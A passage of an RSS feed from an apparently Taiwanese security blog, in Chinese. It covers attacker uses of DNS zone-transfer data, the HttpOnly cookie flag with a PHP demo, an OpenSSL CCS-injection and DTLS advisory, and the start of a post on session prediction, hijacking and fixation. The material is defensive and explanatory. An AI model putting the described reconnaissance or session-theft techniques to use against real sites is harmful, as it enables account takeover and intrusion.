    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;按-end-的人有福了&quot;&gt;按 End 的人有福了&lt;/h3&gt;

&lt;p&gt;究竟經由 zone transfer 所得到的資料可以拿來做什麼？對於攻擊者而言，主要有以下三種利用方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;建立字典檔：入侵者可利用上述資料建立一份最常見的 subdomain 的字典檔，未來利用此字典檔進行掃描時可節省許多時間成本，快速檢測某間公司有哪些 subdomain&lt;/li&gt;
  &lt;li&gt;旁敲側擊：入侵者可觀察哪些 name server 有開放 zone transfer 查詢，接著去蒐集還有哪些公司使用同一台 name server，再進一步掃瞄那些 domain。那些 domain 也許不是大公司、不在 Alexa top 1M 內，但你無法確保它永遠不會是入侵者的攻擊目標。&lt;/li&gt;
  &lt;li&gt;結合 0day 進行攻擊：當某個第三方套件被揭露 0day 弱點時，擁有上述資料的人就可以迅速執行大範圍的攻擊。例如&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;這幾年正夯的 Rails 在去年被爆出有 Remote Code Exection 弱點 CVE-2013-0156&lt;/a&gt;，入侵者可直接對所有 redmine 進行攻擊。&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN 在今年也被揭露 Remote Code Execution 弱點&lt;/a&gt;，入侵者可找尋所有 vpn subdomain 來進行嘗試。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在上次我們提起這個古老的弱點後，已經有部分台灣企業陸續將此問題修復，但許多台灣企業仍有此問題而不自知，也許過陣子我們直接做個 Wall of Shame 條列出哪些廠商有問題會讓大家比較有感 :p&lt;/p&gt;

&lt;p&gt;不過也別急著笑台灣企業，許多國際級的大網站同樣也有此類問題。由此可見資安問題不分新舊、不分國內外，總是容易被大家忽略，等到不知不覺被入侵者捅了重重的一刀後，才驚覺這許多的小弱點一旦串起來是多麼的可怕。你，開始有所警覺了嗎？&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/</link>
                <guid>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</guid>
                <pubDate>Fri, 13 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HttpOnly - HTTP Headers 的資安議題 (3)</title>
                <description>&lt;p&gt;上次我們提到了 &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;

&lt;h3 id=&quot;httponly-簡介&quot;&gt;HttpOnly 簡介&lt;/h3&gt;

&lt;p&gt;Cookie 的概念雖然早在 1994 年就由 Netscape 的工程師 Montulli 提出，但當時仍未有完善的防護機制，像是 HttpOnly、Secure 等規範都是後來陸續被提出，直到 2011 年 4 月才在 &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; 中正式定案。而其中的 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; 是專門為了抵禦攻擊者利用 Cross-Site Scripting (XSS) 手法來盜取用戶身份，此項 Cookie 防護設定應該是在 HTTP Headers 系列文中最廣為人知的項目。&lt;/p&gt;

&lt;h3 id=&quot;httponly-主要作用&quot;&gt;HttpOnly 主要作用&lt;/h3&gt;

&lt;p&gt;說明 HttpOnly 主要作用之前，先談談 XSS 最常見的利用方式。XSS 攻擊早在 1990 年就被發現，此攻擊手法最常見的利用方式是存取使用者的 cookie 來獲得一些機敏資料。像是存取 session cookie 即可盜用使用者的身份（關於 session 的重要性，可以參考我們部落格的另一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session 攻擊與防護&lt;/a&gt;），如果在 cookie 中記錄了其他機敏資訊，也可能會一併遭竊。因此若能阻止攻擊者存取帶有敏感資料的 cookie，就能減少 XSS 對使用者的影響，因而催生了 HttpOnly 機制。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;當 cookie 有設定 HttpOnly flag 時，瀏覽器會限制 cookie 只能經由 HTTP(S) 協定來存取。因此當網站有 XSS 弱點時，若 cookie 含有 HttpOnly flag，則攻擊者無法直接經由 JavaScript 存取使用者的 session cookie，可降低使用者身份被盜用的機率。早期有些瀏覽器未完整實作 HttpOnly 所有功能，因此攻擊者仍可透過 XMLHttpRequest 讀取 cookie，但最近幾年各大瀏覽器也陸續阻擋了這個方式。因此 HttpOnly 可有效降低 XSS 的影響並提升攻擊難度。目前瀏覽器的支援列表如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly 瀏覽器支援列表&quot; title=&quot;HttpOnly 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其他瀏覽器支援列表以及各家程式語言使用 HttpOnly 的方式可參考 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;以下使用 PHP 程式碼為例：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;If you didn&apos;t set HttpOnly flag, cookie will write down by document.write().&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; title=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在上圖中可看到 PHPSESSID 已成功被 JavaScript 存取，這也意味著網站有 XSS 弱點時，使用者的身份有較高的機率被盜用。為了使用 HttpOnly 進行防護，讓我們將 PHP 程式碼修改如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;session.cookie_httponly&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; title=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們可以使用畫面中右上角的 Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie 套件&lt;/a&gt; 看到 HttpOnly 已經被勾選（如紅框處），並且 PHPSESSID 已無法被 JavaScript 存取，不存在於 HTML 中。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前 PHP 官方的教學是用 session_set_cookie_params 這個 function，可參考&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;官方網頁的這篇說明&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly-實際使用案例&quot;&gt;HttpOnly 實際使用案例&lt;/h3&gt;

&lt;p&gt;由於 HttpOnly 的使用方式較簡單，因此僅列舉幾個站台的使用結果圖片給大家參考，就不另外多做說明囉！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;T客邦 (www.techbang.com)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;T客邦&quot; title=&quot;T客邦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;愛料理 (icook.tw)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;愛料理&quot; title=&quot;愛料理&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;HttpOnly 是存在已久的技術，但在我們&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;系列文第一篇&lt;/a&gt;的統計當中，採用的比例仍然偏低。如同之前我們提及的 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; 問題，即使一項資安技術或資安議題存在很久，也需要大家持續關注。&lt;/p&gt;

&lt;p&gt;但即使採用了 HttpOnly，也僅能防止惡意人士不正當存取 cookie，無法防禦其他的 XSS 攻擊方式，例如將使用者導向至釣魚網站騙取個資、導向至惡意網站植入後門、置換網頁外觀等等。同時未來仍有可能出現新的 XSS 攻擊手法，因此千萬別因設定了 HttpOnly 就掉以輕心，誤以為不會再被 XSS 手法侵害企業利益或用戶資料，仍然必須謹慎檢查每一個系統輸出輸入點，以避免未來因上述影響導致用戶或企業蒙受損失。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/</link>
                <guid>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</guid>
                <pubDate>Wed, 11 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL 再爆嚴重漏洞，部分重要網站仍在風險中！</title>
                <description>&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL 團隊於 6/5 修補了&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;六項安全漏洞&lt;/a&gt;，&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; 在&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;這篇文章&lt;/a&gt;中整理了這幾個漏洞的摘要，這裡截圖表格如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 安全更新比較表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其中 CVE-2014-0224、CVE-2014-0195 兩項被列為 Critical，我們分別來看看這兩個弱點到底造成了什麼危害。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;說明&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;加密通訊被視為預防&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;中間人攻擊&lt;/a&gt;的解法之一，利用 SSL 協定防止竊聽、竄改傳輸資料是一種常見的方式。然而 OpenSSL 這次出現在 ChangeCipherSpec（更改密鑰規格）的設計瑕疵，讓攻擊者有辦法解密所有通訊內容，讓加密保護徹底失效。&lt;/p&gt;

&lt;p&gt;該弱點原理是 OpenSSL 伺服器端在實作 handshake 時並未檢查訊息的順序（嚴格來說是 ChangeCipherSpec 的順序），所以攻擊者可以提前送出 ChangeCipherSpec 訊息，使伺服器在還未初始完畢的狀態先去做 ChangeCipherSpec 的動作，最終造成加解密可解的狀況，是以此弱點稱之為 CCS Injection。更多的細節請參考原通報者 Masashi Kikuchi 的&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;部落格&lt;/a&gt;，佐以&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;這篇&lt;/a&gt;附程式碼的解說，OpenSSL github 上關於 CVE-2014-0224 的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; 也可以幫助了解。&lt;/p&gt;

&lt;h4 id=&quot;誰應該注意&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;所有靠 OpenSSL 保護連線的應用服務都需要注意。又尤其是銀行、金流服務這些連線中存在金融資訊的服務，若不注意會造成信用卡卡號洩漏，網路銀行被盜用。經過實際檢測，&lt;strong&gt;目前仍有銀行單位和金流單位使用有問題的 OpenSSL 版本&lt;/strong&gt;。消費者需要特別注意，在使用前也可透過下面小工具來輔助檢查自己所使用的服務使否存在風險：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire 提供的&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;小程式&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;測試網站 &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;慶幸的是，此弱點只發生在用戶端及伺服器端皆使用有問題 OpenSSL 版本的狀況下。一般來說，桌面端的瀏覽器都不是使用 OpenSSL，所以一般使用者可以稍微安心。問題比較大的是 android 使用者，android 內建 OpenSSL，許多 app 呼叫它來進行加密傳輸，所以建議 android 用戶在 google 釋出更新前，不要使用手機連線到有問題的服務，或使用自帶 SSL 的 app，例如：firefox、最新版 Chrome (35.0.1916.141)…。&lt;/p&gt;

&lt;p&gt;另外，若使用者常用到一些加密連線服務，例如 VPN，請自行注意所使用軟體是否使用 OpenSSL，以免受到 CCS Injection 的影響。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最後說個題外話，原來現在發表漏洞還要為漏洞出張圖，在 Hacker News 原討論串的&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;這篇回應&lt;/a&gt;，就有人說：『這個漏洞有 logo 嗎？如果沒有我就不打算認真看待它！』XD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;說明-1&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;OpenSSL 在處理 &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; 訊息上，為了避免 IP fragmentation，所以做了一些處理機制，這個處理機制並沒有好好驗證 DLTS ClientHello 中的 fragment 長度（嚴格來說是在正確的位置做驗證），若攻擊者發送一個很長的 fragment，能造成緩衝區溢位攻擊。更多的細節請參考&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;這篇文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;比較有趣的是那段出問題的程式碼是一位有名德國工程師 Robin Seggelmann 寫的，有名的點在於上次非常嚴重的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 事件也是他寫的 code XD&lt;/p&gt;

&lt;h4 id=&quot;誰應該注意-1&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;使用 OpenSSL 且有用到 DTLS 的服務提供者，通常是 VoIP、WebRTC、VPN 這類服務，這個風險有可能會造成伺服器被入侵。&lt;/p&gt;

&lt;h3 id=&quot;修補&quot;&gt;修補&lt;/h3&gt;

&lt;p&gt;除了上面所提及兩個嚴重風險，這次的更新也同時修復了幾個 DOS 的弱點，強烈建議伺服器端更新。
請確認 OpenSSL 已經更新到下面版本，並且有重新啟動讓其生效。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OpenSSL 0.9.8za&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.0m&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.1h&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;更新資訊依據所用的系統分別如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;這次 OpenSSL 做了數個安全性的更新，雖然不若&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;之前 Heartbleed 那麼嚴重&lt;/a&gt;，但卻也讓使用者暴露在風險中。建議有使用 OpenSSL 都應該更新到最新版本，尤其是一些大型的銀行及金流服務，更應儘速更新。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/</link>
                <guid>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</guid>
                <pubDate>Mon, 09 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Session 攻擊與防護</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;大家還記得四月份的 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;

&lt;p&gt;但是，其實這樣的風險是可以避免的，今天我們以開發者的角度來談談 Session 的攻擊與防護。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;什麼是-session什麼是-cookie&quot;&gt;什麼是 Session？什麼是 Cookie？&lt;/h3&gt;

&lt;p&gt;在談 Session 之前，我們要先瞭解 Cookie。你知道網站是如何辨識我們的身份嗎？為什麼我們輸入完帳號密碼之後，網站就知道我們是誰呢？就是利用 Cookie。Cookie 是網站在瀏覽器中存放的資料，內容包括使用者在網站上的偏好設定、或者是登入的 Session ID。網站利用 Session ID 來辨認訪客的身份。&lt;/p&gt;

&lt;p&gt;Cookie 既然存放在 Client 端，那就有被竊取的風險。例如透過 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting（跨站腳本攻擊，又稱 XSS）&lt;/a&gt;，攻擊者可以輕易竊取受害者的 Cookie。如果 Cookie 被偷走了，你的身份就被竊取了。&lt;/p&gt;

&lt;p&gt;我們可以用一個譬喻來表示：你加入了一個秘密俱樂部，填寫完會員資料後，得到了一張會員卡。之後只要憑這張會員卡，就可以進入這個俱樂部。但是隔天，你的會員卡掉了。撿走你會員卡的人，就可以用你的會員卡進入這個秘密俱樂部，因為會員卡上沒有你的照片或是其他足以辨識身分的資訊。這就像是一個會員網站，我們申請了一個帳號（填寫會員資料加入俱樂部），輸入帳號密碼登入之後，得到一組 Cookie，其中有 Session ID 來辨識你的身分（透過會員卡來辨識身分）。今天如果 Cookie 被偷走了（會員卡被撿走了），別人就可以用你的帳號來登入網站（別人用你的會員卡進入俱樂部）。&lt;/p&gt;

&lt;p&gt;Session 攻擊手法有三種：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;猜測 Session ID (Session Prediction)&lt;/li&gt;
  &lt;li&gt;竊取 Session ID (Session Hijacking)&lt;/li&gt;
  &lt;li&gt;固定 Session ID (Session Fixation)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我們以下一一介紹。&lt;/p&gt;

&lt;h4 id=&quot;session-prediction-猜測-session-id&quot;&gt;Session Prediction (猜測 Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID 如同我們前面所說的，就如同是會員卡的編號。只要知道 Session ID，就可以成為這個使用者。如果 Session ID 的長度、複雜度、雜亂度不夠，就能夠被攻擊者猜測。攻擊者只要寫程式不斷暴力計算 Session ID，就有機會得到有效的 Session ID 而竊取使用者帳號。&lt;/p&gt;

&lt;p&gt;分析 Session ID 的工具可以用以下幾種&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;觀察 Session ID 的亂數分布，可以了解是否能夠推出規律、猜測有效的 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;分析 Session ID&quot; title=&quot;分析 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;使用 Session ID 分析程式進行分析，評估是否無法被預測。如果沒有 100% 的把握自己撰寫的 Session ID 產生機制是安全的，不妨使用內建的 Session ID 產生 function，通常都有一定程度的安全。&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking-竊取-session-id&quot;&gt;Session Hijacking (竊取 Session ID)&lt;/h4&gt;

&lt;p&gt;竊取 Session ID 是最常見的攻擊手法。攻擊者可以利用多種方式竊取 Cookie 獲取 Session ID：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;跨站腳本攻擊 (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)：利用 XSS 漏洞竊取使用者 Cookie&lt;/li&gt;
  &lt;li&gt;網路竊聽：使用 ARP Spoofing 等手法竊聽網路封包獲取 Cookie&lt;/li&gt;
  &lt;li&gt;透過 Referer 取得：若網站允許 Session ID 使用 URL 傳遞，便可能從 Referer 取得 Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;竊取利用的方式如下圖：&lt;/p&gt;

